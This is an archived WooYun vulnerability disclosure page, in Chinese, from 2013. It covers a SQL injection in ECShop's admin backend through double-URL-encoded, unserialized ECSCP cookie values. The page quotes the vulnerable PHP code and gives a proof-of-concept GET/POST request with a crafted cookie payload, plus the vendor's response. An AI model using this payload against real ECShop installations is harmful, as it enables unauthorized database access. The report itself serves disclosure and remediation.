@@ -1,0 +1,230 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		ecshop最新版本后台所有功能块通用SQL注入(全版本亦可)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		ecshop最新版本后台所有功能块通用SQL注入(全版本亦可)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/blue">blue</a> 
+</li><li>提交时间：		2013-05-30 23:44</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-05-30：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-05-31：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-06-03：	细节向第三方安全合作伙伴开放<br/>
+									2013-06-10：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-06-20：	细节向普通白帽子公开<br/>
+									2013-07-10：	细节向实习白帽子公开<br/>
+									2013-08-28：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">后台的SQL注入，几乎所有的后台功能块都能用此方法注入，进入后台就可以用此提升下自己的权限了，当然，“进入后台”让这个漏洞鸡肋了，你懂的～～～</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">$filter = unserialize(urldecode($_COOKIE[&#039;ECSCP&#039;][&#039;lastfilter&#039;])); <br />
+<br />
+这一句是核心，urldecode看到了么？所以啊，只要%27、%2527就能绕过init.php里对$_COOKIE的addslashes_deep了～～～<br />
+<br />
+两个地方：<br />
+<br />
+1.订单详情<br />
+<br />
+</p><pre><code>/admin/order.php //158行<br />
+ $filter = unserialize(urldecode($_COOKIE[&#039;ECSCP&#039;][&#039;lastfilter&#039;]));</code></pre><p class='detail'><br />
+<br />
+2.后台几乎各功能块列表都会用到的get_filter()方法<br />
+<br />
+</p><pre><code>/admin/includes/lib_main.php //718行<br />
+function get_filter($param_str = &#039;&#039;)<br />
+{<br />
+    $filterfile = basename(PHP_SELF, &#039;.php&#039;);<br />
+    if ($param_str)<br />
+    {<br />
+        $filterfile .= $param_str;<br />
+    }<br />
+    if (isset($_GET[&#039;uselastfilter&#039;]) &amp;&amp; isset($_COOKIE[&#039;ECSCP&#039;][&#039;lastfilterfile&#039;])<br />
+        &amp;&amp; $_COOKIE[&#039;ECSCP&#039;][&#039;lastfilterfile&#039;] == sprintf(&#039;%X&#039;, crc32($filterfile)))  //这虽然麻烦，但可控制<br />
+    {<br />
+        return array(<br />
+            &#039;filter&#039; =&gt; unserialize(urldecode($_COOKIE[&#039;ECSCP&#039;][&#039;lastfilter&#039;])), //这里又见重点<br />
+            &#039;sql&#039;    =&gt; base64_decode($_COOKIE[&#039;ECSCP&#039;][&#039;lastfiltersql&#039;])<br />
+        );<br />
+    }<br />
+    else<br />
+    {<br />
+        return false;<br />
+    }<br />
+}</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/30233022d10958713f5b106401d355797dccc7ce.png" target="_blank"><img src="../images/30233022d10958713f5b106401d355797dccc7ce.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+看接下来的漏洞证明吧～～<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">订单详情的，这个好弄些<br />
+<br />
+</p><p class="detail"><a href="../images/3023310777cdf89af7c3f60d64ba151bb60dcf95.png" target="_blank"><img src="../images/3023310777cdf89af7c3f60d64ba151bb60dcf95.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+get_filter方法的，拿文章列表来测试，满足触发条件可能麻烦些，说个简单的方法，把条件“==”你控制不了的那一边echo输出出来，然后控制的那一边改一下就好了（我说的不绕口吧？）<br />
+<br />
+</p><p class="detail"><a href="../images/302334289ae7ca285b303b50398031a86435b58e.png" target="_blank"><img src="../images/302334289ae7ca285b303b50398031a86435b58e.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+相关代码（文章列表的，供测试）<br />
+<br />
+</p><pre><code>GET:<br />
+http://localhost/test/ecshop/admin/article.php?is_ajax=1&amp;uselastfilter=1<br />
+<br />
+POST:<br />
+act=query&amp;keyword=&amp;cat_id=0<br />
+<br />
+COOKIE: <br />
+ECSCP[lastfilterfile]=23A0E66; <br />
+ECSCP[lastfilter]=a%253A1%253A%257Bs%253A5%253A%2522start%2522%253Bs%253A2%253A%25221%2527%2522%253B%257D; //cookie修改这两处</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+怎样，有了这个，还要再找后台SQL注入么？ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">进入sql语句前，再进行过滤最靠谱 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/blue" title="blue">blue</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-024840" title="ecshop最新版本后台所有功能块通用SQL注入(全版本亦可)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：2 </p>
+													<p class="detail">确认时间：2013-05-31 08:44</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您为shopex安全做的贡献<br />
+我们会尽快处理<br />
+非常感谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="24840";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
